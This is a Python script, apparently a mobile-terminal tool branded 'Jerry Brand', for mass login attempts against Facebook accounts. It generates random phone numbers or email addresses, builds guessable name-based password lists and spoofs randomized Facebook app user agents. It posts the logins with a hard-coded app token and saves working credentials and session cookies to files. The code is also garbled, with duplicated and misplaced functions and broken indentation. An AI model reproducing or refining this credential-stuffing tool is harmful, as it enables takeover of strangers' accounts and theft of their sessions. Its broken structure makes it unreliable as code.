from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
def clear():
        os.system('clear')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
except:pass

# --- Updated 2025 Working Headers ---
header_grup = {'user-agent':'FBAN/FB4A;FBAV/450.0.0.44.109;FBPN/com.facebook.katana;FBLC/en_US;FBBV/563214789;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBDV/SM-S928B;FBSV/14;FBCA/arm64-v8a:armeabi-v7a;FBDM/{density=3.0,width=1440,height=3120}'}
head = {'User-Agent': 'Davik/2.1.0 (Linux; U; Android 14; SM-S938B Build/UP1A.231005.007; wv) [FBAN/AndroidSampleApp;FBAV/450.0.0.44.109;FBLC/en_US;FBBV/563214789;FBCR/Zong;FBMF/samsung;FBBD/samsung;FBDV/SM-S938B;FBSV/14;FBCA/arm64-v8a:armeabi-v7a;FBDM/{density=3.0,width=1440,height=3120};FB_FW/1]'}
api = {"user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36","referer": "https://business.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-US,en;q=0.9,en-PK;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8","content-type":"application/x-www-form-urlencoded"}
user_agent=['Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36 [FBAN/FB4A;FBAV/448.0.0.42.116;]',
'Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/385.0.0.12.115;]',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36 [FBAN/FB4A;FBAV/440.0.0.35.110;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21E219 [FBAN/FBIOS;FBAV/450.0.0.44.109;]',
'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; vivo V2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; TECNO CK6n) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.44.109;]"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 13; Nokia X20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
uas_samsungse = "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/115.0.0.0 Mobile Safari/537.36"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21E219 [FBAN/FBIOS;FBAV/450.0.0.44.109;]"
ugen=[]
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['11','12','13','14','15'])
    c='SM-S' + str(random.randint(900, 999)) + 'B Build/'
    d=random.choice(string.ascii_uppercase)
    e=random.randrange(1, 999)
    f=random.choice(string.ascii_uppercase)
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(115,126)
    i='0'
    j=random.randrange(5500,6900)
    k=random.randrange(100,250)
    l='Mobile Safari/537.36 [FBAN/FB4A;FBAV/452.0.0.45.110;]'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)  

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
    fbcr = 'Jazz'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=3.0,height=2400,width=1080}'

device = {
    'android_version':android_version,
    'model':model,
    'build':build,
    'fblc':fblc,
    'fbmf':fbmf,
    'fbbd':fbbd,
    'fbdv':model,
    'fbsv':fbsv,
    'fbca':fbca,
    'fbdm':fbdm}

    logo=("""\033[1;32m
  
╱╱╭┳━━━┳━━━┳━━━┳╮╱╱╭╮
╱╱┃┃╭━━┫╭━╮┃╭━╮┃╰╮╭╯┃
╱╱┃┃╰━━┫╰━╯┃╰━╯┣╮╰╯╭╯
╭╮┃┃╭━━┫╭╮╭┫╭╮╭╯╰╮╭╯
┃╰╯┃╰━━┫┃┃╰┫┃┃╰╮╱┃┃
╰━━┻━━━┻╯╰━┻╯╰━╯╱╰╯
-------------------------------------------
 𝗔𝗨𝗧𝗛𝗢𝗥   : Jerry Brand 🔥😈
 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  : 2.0 (Updated)
 𝗦𝗧𝗔𝗧𝗨𝗦    : Free Working
--------------------------------------------""")

def menu():
    clear()
    print(logo)
    print(" [1] File Cloning")
    print(" [2] Random Cloning")
    print(" [0] Exit")
    linex()
    opt = input(' Choose: ')
    if opt == '1':
        file_crack()
    elif opt == '2':
        random_crack()
    else:
        exit()
        def SIM1(ids, pas):
    global loop, oks, cps
    sys.stdout.write(f'\r\r\033[1;37m [JERRY-M1] {loop}|\033[1;32mOK:-{len(oks)} \033[1;37m');sys.stdout.flush()
    try:
        for password in pas:
            ua = random.choice(ugen)
            url = 'https://b-graph.facebook.com/auth/login'
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23462a4a61",
                "sdk_version": f"{random.randint(1,26)}",
                "email": ids,
                "locale": "en_US",
                "password": password,
                "sdk": "android",
                "generate_session_cookies": "1",
                "sig": "4f3594f10114757c2a715f5399589a7a"
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com',
                'X-FB-HTTP-Engine': 'Liger'
            }
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r\033[1;32m [JR-OK] {ids} | {password}')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(po):
                cps.append(ids)
                break
        loop += 1
    except:
        pass

if __name__ == '__main__':
    menu()
       # -------- Updated Device Logic 2025 --------
    if random.choice([True, False]):
        # Latest Android Models
        model, brand, ver = random.choice([
            ("SM-S938B", "Samsung", "15"), ("2404", "Vivo", "14"), 
            ("Pixel-9Pro", "Google", "15"), ("M2101K6G", "Xiaomi", "14"),
            ("RMX3850", "Realme", "13"), ("CPH2573", "Oppo", "14")
        ])
        chrome_ver = f"{random.randint(120,131)}.0.{random.randint(6000,7000)}.{random.randint(100,200)}"
        fbav = f"{random.randint(450,500)}.0.0.{random.randint(10,99)}.{random.randint(100,200)}"
        fban = random.choice(["FB4A", "FBAN/Orca", "FBAN/Messenger", "FBAN/Katana"])

        ua = (
            f"Mozilla/5.0 (Linux; Android {ver}; {model}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36 "
            f"[FBAN/{fban};FBAV/{fbav};FBDV/{model};FBMF/{brand};FBBD/{brand};FBSV/{ver};FBOP/1;FBCR/Jazz]"
        )
    else:
        # Latest iPhone Models
        model, ios_ver = random.choice([("iPhone16,2", "18.1"), ("iPhone15,3", "17.6"), ("iPhone14,5", "16.5")])
        fbav = f"{random.randint(450,500)}.0.0.{random.randint(10,99)}"
        ua = (
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver.replace('.', '_')} like Mac OS X) "
            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21E219 "
            f"[FBAN/FBIOS;FBAV/{fbav};FBDV/{model};FBSN/iOS;FBSV/{ios_ver};FBSS/3;FBCR/Telenor]"
        )
    return ua

# --- Main Branding ---
logo=("\033[1;32m   [ JERRY BRAND - UPDATED 2025 ] \033[1;37m")
def linex(): print('\033[1;37m-------------------------------------------')

def menu():
    clear()
    print(logo)
    print(' [1] File Cloning (M-1)')
    print(' [2] Random Cloning (M-2)')
    print(' [3] Create File')
    print(' [0] Exit')
    linex()
    opt = input(' Choose: ')
    if opt == '1': file_crack()
    elif opt == '2': random_crack()
    elif opt == '3': os.system('python create_file.py')
    else: exit()
 def random_crack():
    clear()
    print(logo)
    print(' [1] Pakistan cloning')
    print(' [2] Bangladesh cloning')
    print(' [3] Gmail cloning')
    print(' [0] Back')
    linex()
    opt = input(' Choose: ')
    if opt == '1': pak()
    elif opt == '2': bd()
    elif opt == '3': gmail()
    else: menu()

def pak():
    clear()
    print(logo)
    print(' [Example: 0300, 0301, 0310, 0345]')
    linex()
    code = input(' Put code: ')
    linex()
    try:
        limit = int(input(' Limit: 2000, 5000, 10000\n Choose: '))
    except: limit = 5000
    for nmbr in range(limit):
        full = "".join(random.choice(string.digits) for _ in range(7))
        user.append(code + full)
    crack_start()

def gmail():
    clear()
    print(logo)
    print(' [Example: @gmail.com, @yahoo.com]')
    linex()
    domain = input(' Domain: ')
    name = input(' First name: ')
    limit = int(input(' Limit: '))
    for x in range(limit):
        user.append(name + str(random.randint(111,999)) + domain)
    crack_start()
    def file_crack():
    clear()
    print(logo)
    print(' [ Example: /sdcard/file.txt ]')
    linex()
    file = input(' Put file path: ')
    try:
        prox = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found!');time.sleep(2);menu()
    linex()
    print(' [1] Method 1 (Fast)')
    print(' [2] Method 2 (Normal)')
    linex()
    mthd = input(' Choose: ')
    linex()
    print(' [1] New Passwords (2025)')
    print(' [2] Old Passwords')
    linex()
    pass_opt = input(' Choose: ')
    clear()
    print(logo)
    print(f' Total IDs : {str(len(prox))}')
    print(' Use Airplane mode for speed')
    linex()
    with tred(max_workers=30) as jerry_crack:
        for user_data in prox:
            ids, names = user_data.split('|')
            first = names.split(' ')[0].lower()
            if pass_opt == '1':
                passlist = [names, first+'123', first+'1234', first+'12345', first+'786', first+'khan', 'khan123', 'khan12345']
            else:
                passlist = [names, first+'123', first+'12345']
            
            if mthd == '1':
                jerry_crack.submit(SIM1, ids, passlist)
            else:
                jerry_crack.submit(SIM2, ids, passlist)

    linex()
    print(' Process Completed')
    print(f' Total OK: {len(oks)}')
    print(f' Total CP: {len(cps)}')
    input(' Press Enter to Back')
    menu()
    def SIM1(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r\033[1;37m [JERRY-M1] {loop}|\033[1;32mOK:-{len(oks)} \033[1;37m');sys.stdout.flush()
    try:
        for pas in passlist:
            ua = random.choice(ugen)
            session = requests.Session()
            url = 'https://b-graph.facebook.com/auth/login'
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23462a4a61",
                "sdk_version": f"{random.randint(10,26)}",
                "email": ids,
                "locale": "en_US",
                "password": pas,
                "sdk": "android",
                "generate_session_cookies": "1",
                "sig": "4f3594f10114757c2a715f5399589a7a"
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-FB-Connection-Type': 'WIFI'
            }
            po = session.post(url, data=data, headers=headers).json()
            
            if 'session_key' in po:
                print(f'\r\r\033[1;32m [JR-OK] {ids} | {pas}')
                # Cookie generation logic
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                cookie = f"sb={base64.b64encode(os.urandom(18)).decode().replace('=','')};{ckkk}"
                print(f'\033[1;37m COOKIE : \033[1;32m{cookie}')
                open('/sdcard/JR-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in str(po):
                print(f'\r\r\033[1;34m [JR-CP] {ids} | {pas}')
                open('/sdcard/JR-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop += 1
    except:
        pass

# --- Script Start ---
if __name__ == '__main__':
    try:
        os.mkdir('/sdcard/JERRY')
    except: pass
    loop = 0
    oks = []
    cps = []
    user = []
    menu()
    
    